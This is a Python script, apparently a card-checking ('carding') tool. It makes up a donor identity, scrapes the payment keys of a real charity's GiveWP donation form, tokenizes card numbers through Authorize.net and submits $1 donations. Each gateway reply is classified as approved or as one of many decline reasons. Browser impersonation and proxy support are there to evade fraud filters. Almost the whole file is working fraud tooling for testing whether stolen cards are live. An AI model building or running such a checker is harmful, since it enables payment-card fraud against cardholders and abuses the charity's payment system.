import re
import json
import uuid
from urllib.parse import urlparse, parse_qs
from faker import Faker
from curl_cffi.requests import AsyncSession

fake = Faker("en_US")

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        parts = card.split("|")
        cc = parts[0].strip() if len(parts) > 0 else ""
        mm = parts[1].strip() if len(parts) > 1 else ""
        yy = parts[2].strip() if len(parts) > 2 else ""
        cvv = parts[3].strip() if len(parts) > 3 else ""
        
        # عدم تعديل السنة أو الشهر للحفاظ على التطابق التام مع نسخة requests
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

    @staticmethod
    def userdata() -> dict:
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.postcode(),
            "email": f"{fn.lower()}.{ln.lower()}@gmail.com",
            "phone": fake.phone_number(),
        }

class Gateway:
    @staticmethod
    def parse_status(text: str) -> str:
        """منطق تقييم الحالة المطابق تماماً لنسخة requests"""
        status = "UNKNOWN_ERROR"

        # ═══ Approved / Charged ═══
        if '"responseCode":"1"' in text or '"resultCode":"Ok"' in text and '"responseCode":"1"' in text:
            status = "Charged - Approved !"

        # ═══ Insufficient Funds / Balance ═══
        elif 'insufficient fund' in text.lower() or 'INSUFFICIENT_FUNDS' in text:
            status = "Insufficient Funds"
        elif 'credit limit' in text.lower() or 'exceeds balance' in text.lower():
            status = "Credit Limit Exceeded"
        elif 'over credit limit' in text.lower() or 'exceeds withdrawal' in text.lower():
            status = "Over Credit Limit"

        # ═══ Card Issues ═══
        elif 'expired' in text.lower() or 'EXPIRED_CARD' in text or '"errorCode":"8"' in text:
            status = "Expired Card"
        elif '"errorCode":"6"' in text or 'card number is invalid' in text.lower() or 'INVALID_CARD' in text:
            status = "Invalid Card Number"
        elif '"errorCode":"7"' in text or 'expiration date is invalid' in text.lower():
            status = "Invalid Expiration Date"
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            status = "Invalid Or Restricted Card"
        elif 'LOST_OR_STOLEN' in text or '"errorCode":"4"' in text or 'pick up card' in text.lower():
            status = "Lost Or Stolen"
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            status = "Pickup Card Special Conditions"

        # ═══ Verification Failures ═══
        elif 'CVV2_FAILURE' in text or '"errorCode":"65"' in text or '"errorCode":"78"' in text:
            status = "CVV2 Failure"
        elif 'AVS mismatch' in text or '"errorCode":"27"' in text or '"errorCode":"127"' in text:
            status = "AVS Mismatch"
        elif '"errorCode":"45"' in text:
            status = "AVS + CVV Mismatch"

        # ═══ Security / Fraud ═══
        elif 'The transaction for donation' in text and 'was declined' in text:
            status = "Declined"
        elif 'Transaction Failed' in text:
            status = "Failed"
        elif 'SUSPECTED_FRAUD' in text or 'fraud' in text.lower():
            status = "Suspected Fraud"
        elif 'SECURITY_VIOLATION' in text:
            status = "Security Violation"
        elif 'COMPLIANCE_VIOLATION' in text:
            status = "Compliance Violation"
        elif '"errorCode":"250"' in text:
            status = "Blocked IP (FDS)"
        elif '"errorCode":"251"' in text:
            status = "Fraud Filter Decline"
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            status = "Cryptographic Failure"

        # ═══ Account Issues ═══
        elif 'DO_NOT_HONOR' in text or '"errorCode":"2"' in text and '"responseCode":"2"' in text:
            status = "Do Not Honor"
        elif 'ACCOUNT_CLOSED' in text:
            status = "Account Closed"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            status = "Payer Account Locked Or Closed"
        elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
            status = "Account Blocked By Issuer"
        elif 'INVALID_ACCOUNT' in text:
            status = "Invalid Account"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            status = "Restricted Or Inactive Account"
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            status = "Declined Due To Updated Account"

        # ═══ Transaction Issues ═══
        elif 'GENERIC_DECLINE' in text:
            status = "Generic Decline"
        elif 'ORDER_NOT_APPROVED' in text:
            status = "Order Not Approved"
        elif 'TRANSACTION_NOT_PERMITTED' in text:
            status = "Transaction Not Permitted"
        elif 'INVALID_TRANSACTION' in text:
            status = "Invalid Transaction"
        elif 'PAYMENT_DENIED' in text:
            status = "Payment Denied"
        elif 'PAYER_CANNOT_PAY' in text:
            status = "Payer Cannot Pay"
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            status = "Reattempt Not Permitted"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            status = "TX Attempts Exceed Limit"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            status = "Transaction Cannot Be Completed"
        elif 'DECLINED_PLEASE_RETRY' in text:
            status = "Declined Please Retry"
        elif 'duplicate' in text.lower() or '"errorCode":"11"' in text:
            status = "Duplicate Transaction"

        # ═══ Merchant / Processor Errors ═══
        elif '"errorCode":"13"' in text or 'merchant' in text.lower() and 'invalid' in text.lower():
            status = "Merchant Account Error"
        elif '"errorCode":"17"' in text or 'card type' in text.lower() and 'not accepted' in text.lower():
            status = "Card Type Not Accepted"
        elif '"errorCode":"3"' in text and '"responseCode":"2"' in text:
            status = "Voice Auth Required"

        # ═══ Held for Review ═══
        elif '"responseCode":"4"' in text:
            status = "Held For Review"

        # ═══ API / Auth Errors ═══
        elif '"E00005"' in text or '"E00006"' in text or '"E00007"' in text:
            status = "API Authentication Error"
        elif '"E00008"' in text or '"E00009"' in text or '"E00010"' in text or '"E00011"' in text:
            status = "API Permission Error"

        # ═══ General Decline ═══
        elif '"responseCode":"2"' in text:
            status = "Declined"
        elif '"responseCode":"3"' in text:
            status = "Processing Error"

        # ═══ Fallback ═══
        else:
            try:
                error_data = json.loads(text)
                if 'transactionResponse' in error_data:
                    tx = error_data['transactionResponse']
                    if 'errors' in tx:
                        errs = tx['errors']
                        if isinstance(errs, dict) and 'error' in errs:
                            status = errs['error'][0].get('errorText', 'UNKNOWN_ERROR')
                        elif isinstance(errs, list):
                            status = errs[0].get('errorText', 'UNKNOWN_ERROR')
                    elif 'messages' in tx:
                        msgs = tx['messages']
                        if isinstance(msgs, dict) and 'message' in msgs:
                            status = msgs['message'][0].get('description', 'UNKNOWN_ERROR')
                elif 'data' in error_data:
                    status = error_data['data'].get('error', 'UNKNOWN_ERROR')
            except:
                status = "UNKNOWN_ERROR"

        return status

    @staticmethod
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        token = str(uuid.uuid4())

        async with AsyncSession(impersonate="chrome120", proxies=proxies) as session:
            try:
                # Step 1: GET donation form page to extract parameters
                headers_init = {
                    "referer": "https://www.ohelfamily.org/donate/",
                }
                params_init = {
                    "givewp-route": "donation-form-view",
                    "form-id": "794",
                    "locale": "en_US",
                }
                resp_init = await session.get(
                    "https://www.ohelfamily.org/",
                    params=params_init,
                    headers=headers_init,
                )
                html = resp_init.text

                # استخدام Regex المطابق تماماً لملف requests
                donate_url_match = re.search(r'"donateUrl":\s*"([^"]+)"', html)
                if not donate_url_match:
                    return "Error", "donateUrl not found", False
                donate_url = donate_url_match.group(1)

                clientPublicKey_match = re.search(r'"clientPublicKey":\s*"([^"]+)"', html)
                if not clientPublicKey_match:
                    return "Error", "clientPublicKey not found", False
                clientPublicKey = clientPublicKey_match.group(1)

                apiLoginId_match = re.search(r'"apiLoginId":\s*"([^"]+)"', html)
                if not apiLoginId_match:
                    return "Error", "apiLoginId not found", False
                apiLoginId = apiLoginId_match.group(1)

                parsed_url = urlparse(donate_url)
                qs = parse_qs(parsed_url.query)
                route_sig = qs.get('givewp-route-signature', [None])[0]
                route_id = qs.get('givewp-route-signature-id', [None])[0]
                route_exp = qs.get('givewp-route-signature-expiration', [None])[0]

                if not route_sig or not route_exp:
                    return "Error", "Missing route signature parameters", False

                # Step 2: Tokenize card via Authorize.net
                headers_auth = {
                    "origin": "https://www.ohelfamily.org",
                    "referer": "https://www.ohelfamily.org/?givewp-route=donation-form-view&form-id=794&locale=en_US",
                    "content-type": "application/json; charset=UTF-8",
                }
                
                # استخدام mk مباشرة كما هو في ملف requests
                mk = f"{card_data['mm']} {card_data['yy']}"
                
                json_auth = {
                    "securePaymentContainerRequest": {
                        "merchantAuthentication": {
                            "name": apiLoginId,
                            "clientKey": clientPublicKey,
                        },
                        "data": {
                            "type": "TOKEN",
                            "id": token,
                            "token": {
                                "cardNumber": card_data["cc"],
                                "expirationDate": mk,
                                "cardCode": card_data["cvv"],
                            },
                        },
                    },
                }
                resp_auth = await session.post(
                    "https://api2.authorize.net/xml/v1/request.api",
                    headers=headers_auth,
                    json=json_auth,
                )
                auth_text = resp_auth.text

                data_value_match = re.search(r'"dataValue":"(.*?)"', auth_text)
                data_descriptor_match = re.search(r'"dataDescriptor":"(.*?)"', auth_text)

                if not data_value_match or not data_descriptor_match:
                    return "Error", "Failed to extract dataValue or dataDescriptor", False

                data_value = data_value_match.group(1)
                data_descriptor = data_descriptor_match.group(1)

                # Step 3: Submit donation form (استخدام files لإرسال multipart/form-data المطابق تماماً لـ requests)
                headers_donate = {
                    "origin": "https://www.ohelfamily.org",
                    "referer": "https://www.ohelfamily.org/?givewp-route=donation-form-view&form-id=794&locale=en_US",
                }
                params_donate = {
                    "givewp-route": "donate",
                    "givewp-route-signature": route_sig,
                    "givewp-route-signature-id": "givewp-donate",
                    "givewp-route-signature-expiration": route_exp,
                }
                
                files_donate = {
                    'amount': (None, '1'),
                    'currency': (None, 'USD'),
                    'donationType': (None, 'single'),
                    'subscriptionPeriod': (None, 'one-time'),
                    'subscriptionFrequency': (None, '1'),
                    'subscriptionInstallments': (None, '0'),
                    'formId': (None, '794'),
                    'p2pSourceID': (None, '0'),
                    'enableTribute': (None, 'hide'),
                    'tributeType': (None, 'In honor of'),
                    'tributesSendNotification': (None, 'send'),
                    'gatewayId': (None, 'authorize'),
                    'feeRecovery': (None, '0'),
                    'p2pSourceType': (None, ''),
                    'honorific': (None, 'Mr.'),
                    'firstName': (None, user_data["first"]),
                    'lastName': (None, user_data["last"]),
                    'email': (None, user_data["email"]),
                    'phone': (None, user_data["phone"]),
                    'constantcontact': (None, 'true'),
                    'country': (None, 'US'),
                    'address1': (None, user_data["address"]),
                    'address2': (None, ''),
                    'city': (None, user_data["city"]),
                    'state': (None, user_data["state"]),
                    'zip': (None, user_data["zip"]),
                    'comment': (None, ''),
                    'dtd': (None, 'undefined'),
                    'feeRecoveryConfirmation': (None, ''),
                    'donationBirthday': (None, ''),
                    'originUrl': (None, 'https://www.ohelfamily.org/donate/'),
                    'isEmbed': (None, 'true'),
                    'embedId': (None, 'give-form-shortcode-2'),
                    'locale': (None, 'en_US'),
                    'gatewayData[give_authorize_data_descriptor]': (None, data_descriptor),
                    'gatewayData[give_authorize_data_value]': (None, data_value),
                }

                resp_donate = await session.post(
                    "https://www.ohelfamily.org/",
                    params=params_donate,
                    headers=headers_donate,
                    files=files_donate,
                )

                status = Gateway.parse_status(resp_donate.text)
                is_live = status == "Charged - Approved !"
                return status, resp_donate.text, is_live

            except Exception as e:
                return "Error", f"Exception: {str(e)}", False


async def process_Au_1(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
    card_data = tools.getcard(card_line)
    if not card_data["cc"]:
        return "Failed", "Invalid card format", False

    user_data = tools.userdata()
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    return await Gateway.charge_card(
        card_data=card_data,
        user_data=user_data,
        proxies=proxies,
    )


# ═══ دالة الاختبار الشاملة ═══
async def main():
    import asyncio
    
    test_card = "4000000000000002|12|2028|123"
    print(f"--- بدء تشغيل الاختبار على البطاقة: {test_card} ---")
    
    card_data = tools.getcard(test_card)
    print(f"[1] استخراج بيانات البطاقة: {card_data}")
    
    user_data = tools.userdata()
    print(f"[2] توليد بيانات المستخدم: {user_data['name']} - {user_data['email']}")
    
    print("[3] جاري إرسال الطلبات عبر curl-cffi...")
    status, response_text, is_live = await process_Au_1(test_card)
    
    print("--- نتائج التنفيذ ---")
    print(f"الحالة المحددة (Status): {status}")
    print(f"هل البطاقة مقبولة (Is Live): {is_live}")
    print(f"جزء من الرد النهائي: {response_text[:300]}...")

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
